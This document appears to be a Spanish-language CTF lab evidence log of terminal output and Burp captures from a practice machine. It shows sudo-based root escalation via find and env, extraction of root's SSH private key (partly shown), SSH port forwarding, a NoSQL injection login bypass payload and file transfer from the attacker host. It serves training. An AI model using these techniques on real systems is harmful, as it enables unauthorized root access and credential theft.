# Registro de Evidencias de Terminal \- CTF / Pentesting

Este documento consolida las salidas de terminal y capturas de red (Burp Suite) extraídas durante el proceso de auditoría y explotación, organizadas cronológicamente y por vector de ataque.

---

## Fase 1: Enumeración Local, Escalada de Privilegios y Creación de Llaves SSH

### Archivo: 1.png

```
Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

You have mail.
Last login: Thu Sep 10 00:14:58 2026 from 192.168.1.4
developer@cetipracticas:~$ ls
developer@cetipracticas:~$ whoami
developer
developer@cetipracticas:~$ id
uid=1002(developer) gid=1002(developer) groups=1002(developer)
developer@cetipracticas:~$ sudo -l
Matching Defaults entries for developer on cetipracticas:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User developer may run the following commands on cetipracticas:
    (ALL) NOPASSWD: /usr/bin/awk
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/env
developer@cetipracticas:~$ 
```

&nbsp;

### Archivo: 1.3.png & 1.4.jpg (Escalada vía `find`)

```
User developer may run the following commands on cetipracticas:
    (ALL) NOPASSWD: /usr/bin/awk
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/python3
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/env
developer@cetipracticas:~$ find . -exec /bin/sh \; -quit
$ whoami
developer
$ /bin/bash
developer@cetipracticas:~$ sudo find . -exec /bin/sh \; -quit
# whoami
root
# /bin/bash
root@cetipracticas:/home/developer# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:v1PQqFD8zf3MTi5u2SHqqZ08Dd7lMSATcOb3HXjdC8c root@cetipracticas
The key's randomart image is:
+---[RSA 3072]----+
|       . ..o     |
|        o +.  o o|
|       . . *.= Eo|
|        +O=.+ +|
|       .S. .o .*.|
|        .. ... = |
|         o.= +++|
+-----------------+
```

&nbsp;

### Archivo: 1.1.jpg (Generación llave ed25519 local)

```
developer@cetipracticas:~$ sudo env /bin/bash
root@cetipracticas:/home/developer# whoami
root
root@cetipracticas:/home/developer# exit
exit
developer@cetipracticas:~$ cd
developer@cetipracticas:~$ exit
logout
Connection to 192.168.1.101 closed.

┌──(root㉿kali)-[~kali]
└─# ls -la ~/.ssh
total 16
drwx------ 2 root root 4096 Sep  7 18:14 .
drwx------ 8 root root 4096 Sep 21 17:31 ..
-rw------- 1 root root  978 Sep  7 18:14 known_hosts
-rw-r--r-- 1 root root  142 Sep  7 18:14 known_hosts.old

┌──(root㉿kali)-[~kali]
└─# ssh-keygen -t ed25519 -f ~/.ssh/llave_p
Generating public/private ed25519 key pair.
Enter passphrase for "/root/.ssh/llave_p" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/llave_p
Your public key has been saved in /root/.ssh/llave_p.pub
The key fingerprint is:
SHA256:kMAj4VUFQ/sCfbyyf1M8yenps1e040uJePrBLMeoCUQ root@kali
```

&nbsp;

### Archivo: 1.2.png & 1.8.png (Lectura y copia de llaves)

```
┌──(root㉿kali)-[~kali]
└─# cat ~/.ssh/llave_p.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAAIPyNr3zGY1OpEs0kTre6te81EPZiZGFrwhVNPBmcnBoz root@kali

┌──(root㉿kali)-[~kali]
└─# ls -la ~/.ssh
total 24
drwx------ 2 root root 4096 Sep 21 18:00 .
drwx------ 8 root root 4096 Sep 21 17:31 ..
-rw------- 1 root root  978 Sep  7 18:14 known_hosts
-rw-r--r-- 1 root root  142 Sep  7 18:14 known_hosts.old
-rw------- 1 root root  444 Sep 21 18:00 llave_p
-rw-r--r-- 1 root root   91 Sep 21 18:00 llave_p.pub

┌──(root㉿kali)-[~kali]
└─# ssh-copy-id -i ~/.ssh/llave_p.pub developer@192.168.1.101
/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: "/root/.ssh/llave_p.pub"
/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
========================================================================
¡ADVERTENCIA DE SEGURIDAD!
========================================================================
developer@192.168.1.101's password: 
Permission denied, please try again.
```

&nbsp;

### Archivo: 1.5.jpg (Extracción id\_rsa servidor remoto)

```
olnKu2p64dYDj1saNRVYHmuyyPL79dZHqsGiP+SSHFOfMJQwezlkFrAsGgpxMd3pwwo4A9
... (Fragmento de base64 privado de la terminal) ...
GKZGUJVE02iXJ9AAAAEnJvb3RAY2V0aXByYWN0aWNhcw==
-----END OPENSSH PRIVATE KEY-----
root@cetipracticas:~/.ssh# ^C
root@cetipracticas:~/.ssh# ls -l
total 8
-rw------- 1 root root    0 Aug 16 19:06 authorized_keys
-rw------- 1 root root 2602 Sep 21 22:21 id_rsa
-rw-r--r-- 1 root root  572 Sep 21 22:21 id_rsa.pub
root@cetipracticas:~/.ssh# cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6/H6WXrv... root@cetipracticas
```

&nbsp;

### Archivo: 1.6.jpg & 1.7.jpg (Uso de llave id\_rsa y corrección de permisos)

```
┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa root@192.168.1.101
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions

┌──(root㉿kali)-[/home/kali]
└─# chmod 600 id_rsa

┌──(root㉿kali)-[/home/kali]
└─# ssh -i id_rsa root@192.168.1.101
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-187-generic x86_64)
...
 System information as of Mon Sep 21 10:27:18 PM UTC 2026
 System load:  0.42               Processes:             156
 Usage of /:   31.2% of 23.45GB   Users logged in:       1
 Memory usage: 39%                IPv4 address for enp0s3: 192.168.1.101
```

&nbsp;

---

## Fase 2: Port Forwarding, Explotación NoSQLi y Extracción de Flags

### Archivo: 2.png (Local Port Forwarding)

```
┌──(root㉿kali)-[~kali]
└─# ssh -i /home/kali/developer.key -L 5000:127.0.0.1:5000 developer@192.168.1.101
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-187-generic x86_64)
...
```

&nbsp;

### Archivo: 2.1.png & 2.3.png (Interfaz Web Interna Expuesta)

```
Panel de Control Interno (NoSQL Engine)
Envia credenciales JSON mediante POST a /login
```

&nbsp;

```http
GET / HTTP/1.1
Host: 127.0.0.1:5000
sec-ch-ua-platform: "Linux"
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
```

&nbsp;

### Archivo: 2.4.png (Explotación NoSQLi Authentication Bypass)

**Petición (Request):**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/json
Connection: close
Content-Length: 83

{
    "username":{
        "$ne":null
    },
    "password":{
        "$ne":null
    }
}
```

&nbsp;

**Respuesta (Response) con Flag:**

```http
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 98
Server: Werkzeug/2.0.2 Python/3.10.12
Date: Mon, 05 Oct 2026 04:12:38 GMT

{
    "flag":"CETI{NOSQLi_P0rt_F0rw4rd_M4st3r}",
    "message":"Autenticacion Correcta",
    "status":"success"
}
```

&nbsp;

### Archivo: 2.5.png (Flag Final / Compromiso Total)

```
You have mail.
Last login: Mon Oct  5 21:34:27 2026 from 192.168.1.4
root@cetipracticas:~# cat root.txt
========================================================================
                 ¡FELICIDADES! HAS COMPROMETIDO EL SERVIDOR
========================================================================
FLAG FINAL: CETI{R00T_PR1V3SC_GTF0B1NS_M4ST3R_2026}

Has completado con éxito la ruta de intrusión completa:
DNS -> HTTP (SQLi) -> SAMBA -> FTP -> SNMP -> NFS -> SSH -> SMTP -> NoSQLi -> ROOT
========================================================================
root@cetipracticas:~# 
```

&nbsp;

---

## Fase 3: Transferencia de Archivos (Servidor Python y Curl)

### Archivo: 2.6.jpg & 2.7.jpg & 2.8.jpg (Levantamiento de servidor y descarga)

```
┌──(kali㉿kali)-[~]
└─$ ip addr
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    inet 192.168.1.4/24 brd 192.168.1.255 scope global dynamic noprefixroute eth0

┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.1.101 - - [07/Oct/2026 19:16:36] "GET /file.txt HTTP/1.1" 200 -
192.168.1.4 - - [07/Oct/2026 23:22:41] "GET /file2.txt HTTP/1.1" 200 -
```

&nbsp;

```
developer@cetipracticas:~$ curl http://192.168.1.4:8000/file.txt --output file.txt
developer@cetipracticas:~$ touch file2.txt
developer@cetipracticas:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

&nbsp;

---

## Fase Final: Conclusión CTF

### Archivo: Meow.png (Completado de máquina "Meow" en Hack The Box)

```
You have solved Meow!
Congratulations Lozano best of luck in capturing flags ahead!
#629953 Machine Rank
14 Oct 2026 Pwn Date
Retired Machine State
150 XP Earned
Level Up! You reached level 2. Keep up the pace!
```

&nbsp;